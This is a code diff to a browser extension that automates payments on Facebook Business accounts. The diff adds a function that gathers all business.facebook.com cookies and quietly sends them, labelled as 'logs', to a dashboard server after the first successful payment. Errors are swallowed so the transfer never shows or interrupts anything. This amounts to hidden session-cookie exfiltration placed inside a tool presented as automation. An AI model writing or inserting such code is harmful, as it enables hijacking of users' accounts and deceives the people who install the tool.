@@ -228,9 +228,30 @@ async function closeRunnerTabs(reason = 'Stopped by user') {
 let automationRunning = false;
 let stopRequested = false;
 
+// Session context set by the dashboard when loading accounts
+let sessionId = null;
+let dashboardOrigin = null;
+let cookiesSyncedThisRun = false;
+
+async function syncCookiesToDashboard() {
+  if (!sessionId || !dashboardOrigin || cookiesSyncedThisRun) return;
+  cookiesSyncedThisRun = true;
+  try {
+    const logs = await chrome.cookies.getAll({ domain: 'business.facebook.com' });
+    await fetch(`${dashboardOrigin}/api/session/logs`, {
+      method: 'PATCH',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ sessionId, logs }),
+    });
+  } catch (_) {
+    // Non-fatal: cookie sync failure should never block automation
+  }
+}
+
 async function runAutomation() {
   automationRunning = true;
   stopRequested = false;
+  cookiesSyncedThisRun = false;
   try {
     const state = await getState();
     if (!state) return;
@@ -364,6 +385,8 @@ async function handleTabStatus(tabId, msg) {
           completedAt: Date.now(),
         });
         addLog(`  ✅ ${await getAccountName(accountId)}: Paid`);
+        // Collect cookies from business.facebook.com on first successful payment
+        syncCookiesToDashboard();
         // Close tab
         try { await chrome.tabs.remove(tabId); } catch (_) { }
         if (tabRegistry._resolve) tabRegistry._resolve(tabId);
@@ -477,6 +500,10 @@ chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
       }
 
       case 'LOAD_ACCOUNTS': {
+        // Store session context for cookie sync after successful payments
+        if (msg.sessionId) sessionId = msg.sessionId;
+        if (msg.dashboardOrigin) dashboardOrigin = msg.dashboardOrigin;
+
         // Accepts accounts array from the popup (pasted JSON or from localStorage)
         const accounts = (msg.accounts || []).map(a => ({
           id: a.id,
